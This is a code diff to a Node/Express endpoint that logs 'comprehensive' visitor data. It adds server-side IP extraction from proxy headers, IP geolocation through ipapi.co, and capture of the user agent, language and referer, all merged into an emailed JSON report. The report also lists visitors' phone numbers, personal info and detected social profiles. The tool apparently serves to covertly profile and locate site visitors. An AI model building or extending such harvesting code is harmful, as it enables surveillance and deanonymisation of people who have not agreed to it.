@@ -79,14 +79,50 @@ app.post('/log', async (req, res) => {
 // Comprehensive visitor data endpoint
 app.post('/log-comprehensive', async (req, res) => {
   try {
-    const comprehensiveData = req.body;
+    const comprehensiveData = req.body || {};
+
+    // Derive IP from proxy headers (Render/NGINX/Cloudflare aware)
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    const cfConnectingIp = req.headers['cf-connecting-ip'];
+    const xRealIp = req.headers['x-real-ip'];
+    const remoteAddr = req.socket?.remoteAddress || req.ip;
+    const derivedIp = (xForwardedFor && xForwardedFor.split(',')[0].trim())
+      || cfConnectingIp
+      || xRealIp
+      || remoteAddr
+      || 'Unknown';
+
+    // Derive additional headers
+    const ua = req.headers['user-agent'] || 'Unknown';
+    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+    const referer = req.headers['referer'] || req.headers['referrer'] || 'Unknown';
+
+    // Server-side IP geolocation (independent of client)
+    let serverGeo = { error: 'lookup_failed' };
+    try {
+      const geoResp = await fetch(`https://ipapi.co/${derivedIp}/json/`);
+      if (geoResp.ok) {
+        serverGeo = await geoResp.json();
+      }
+    } catch (e) {
+      // ignore
+    }
 
     // Store comprehensive data in a structured format
     const processedData = {
       timestamp: new Date().toISOString(),
       sessionId: comprehensiveData.sessionId,
       visitorType: 'comprehensive',
-      data: comprehensiveData
+      data: {
+        ...comprehensiveData,
+        serverDerived: {
+          ip: derivedIp,
+          userAgent: ua,
+          acceptLanguage,
+          referer,
+          geo: serverGeo
+        }
+      }
     };
 
     // Log to console for debugging
@@ -119,14 +155,18 @@ app.post('/log-comprehensive', async (req, res) => {
 • Phone: ${comprehensiveData.personalInfo?.phone || 'Not provided'}
 
 🌍 LOCATION:
-• IP: ${comprehensiveData.locationInfo?.ipLocation?.ip || 'Unknown'}
-• Country: ${comprehensiveData.locationInfo?.ipLocation?.country_name || 'Unknown'}
-• City: ${comprehensiveData.locationInfo?.ipLocation?.city || 'Unknown'}
+• Client-IP: ${comprehensiveData.locationInfo?.ipLocation?.ip || 'Unknown'}
+• Client-Country: ${comprehensiveData.locationInfo?.ipLocation?.country_name || 'Unknown'}
+• Client-City: ${comprehensiveData.locationInfo?.ipLocation?.city || 'Unknown'}
+• Server-IP: ${derivedIp}
+• Server-Country: ${processedData.data.serverDerived?.geo?.country_name || 'Unknown'}
+• Server-City: ${processedData.data.serverDerived?.geo?.city || 'Unknown'}
 
 💻 BROWSER:
-• User Agent: ${comprehensiveData.browserInfo?.userAgent?.substring(0, 100) || 'Unknown'}
+• User Agent: ${comprehensiveData.browserInfo?.userAgent?.substring(0, 100) || ua.substring(0,100) || 'Unknown'}
 • Platform: ${comprehensiveData.browserInfo?.platform || 'Unknown'}
-• Language: ${comprehensiveData.browserInfo?.language || 'Unknown'}
+• Language: ${comprehensiveData.browserInfo?.language || acceptLanguage}
+• Referer: ${referer}
 
 🎯 SOCIAL PROFILES DETECTED: ${Object.keys(comprehensiveData.socialProfiles || {}).length}
 
@@ -142,7 +182,7 @@ app.post('/log-comprehensive', async (req, res) => {
       attachments: [
         {
           filename: `visitor_${processedData.sessionId || 'unknown'}.json`,
-          content: Buffer.from(JSON.stringify(comprehensiveData, null, 2)),
+          content: Buffer.from(JSON.stringify(processedData.data, null, 2)),
           contentType: 'application/json'
         }
       ]
